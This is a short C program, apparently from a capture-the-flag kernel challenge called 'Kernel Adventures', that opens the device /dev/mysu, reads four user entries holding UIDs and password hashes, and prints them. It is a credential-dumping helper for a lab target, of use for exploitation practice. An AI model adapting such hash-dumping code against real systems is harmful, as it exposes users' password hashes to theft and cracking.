#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>

struct user_entry {
    uint32_t uid;
    uint32_t password_hash;
};

int mysu_fd;

int main() {
    printf("Kernel Adventures Part 1 Hash Dumper\n");

    mysu_fd = open("/dev/mysu", O_RDWR);
    if (mysu_fd == -1) {
        printf("Failed to open '/dev/mysu'\n");
        exit(1);
    }

    struct user_entry users[4];
    memset(users, 0, sizeof(users));


    ssize_t count = read(mysu_fd, &users, sizeof(users));

    if (count != sizeof(users)) {
        printf("Failed to read '/dev/mysu'\n");
        exit(1);
    }
    else {
        printf("Successfully read '/dev/mysu'\n");
    }


    printf("User entries:\n");
    for (int i = 0; i < sizeof(users) / sizeof(struct user_entry); i++) {
        printf("%d %d\n", users[i].uid, users[i].password_hash);
    }

    return 0;
}
